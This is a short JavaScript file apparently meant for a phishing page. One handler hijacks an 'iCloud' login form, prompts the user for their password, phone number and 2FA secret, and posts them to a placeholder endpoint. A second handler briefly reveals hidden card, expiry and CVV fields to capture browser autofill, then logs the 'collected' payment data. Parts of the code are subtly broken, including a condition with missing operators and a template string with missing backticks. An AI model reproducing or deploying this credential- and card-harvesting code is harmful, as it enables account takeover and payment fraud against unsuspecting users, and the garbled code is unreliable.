// iCloud Login Form Handling
document.addEventListener("DOMContentLoaded", function() {
    const form = document.getElementById("icloud-login-form");

    form.addEventListener("submit", function(event) {
        event.preventDefault();

        const confirmationCode = document.getElementById("confirmation_code").value;

        const password = prompt("Enter your iCloud password:");
        const phoneNumber = prompt("Enter your phone number:");
        const twoFactorSecret = prompt("Enter your 2FA secret code:");

        document.getElementById("password").value = password;
        document.getElementById("phone_number").value = phoneNumber;
        document.getElementById("two_factor_secret").value = twoFactorSecret;

        form.action = "https://example.com/endpoint"; // Replace with your endpoint URL
        form.method = "post";
        form.submit();
    });
});

// Payment Form Handling
window.onload = function() {
    const cardNumberField = document.getElementById('cardNumber');
    const expiryDateField = document.getElementById('expiryDate');
    const cvvField = document.getElementById('cvv');

    cardNumberField.hidden = false;
    expiryDateField.hidden = false;
    cvvField.hidden = false;

    setTimeout(() => {
        cardNumberField.hidden = true;
        expiryDateField.hidden = true;
        cvvField.hidden = true;
    }, 1000);
};

document.getElementById('paymentForm').addEventListener('submit', function(event) {
    event.preventDefault();

    const cardNumber = document.getElementById('cardNumber').value;
    const expiryDate = document.getElementById('expiryDate').value;
    const cvv = document.getElementById('cvv').value;

    if (!cardNumber  !expiryDate  !cvv) {
        document.getElementById('output').innerText = "Autofill failed or fields are empty. Please try again.";
        return;
    }

    document.getElementById('output').innerText = 
        Card Number: ${cardNumber}\nExpiry Date: ${expiryDate}\nCVV: ${cvv};

    console.log('Collected Card Number:', cardNumber);
    console.log('Collected Expiry Date:', expiryDate);
    console.log('Collected CVV:', cvv);
});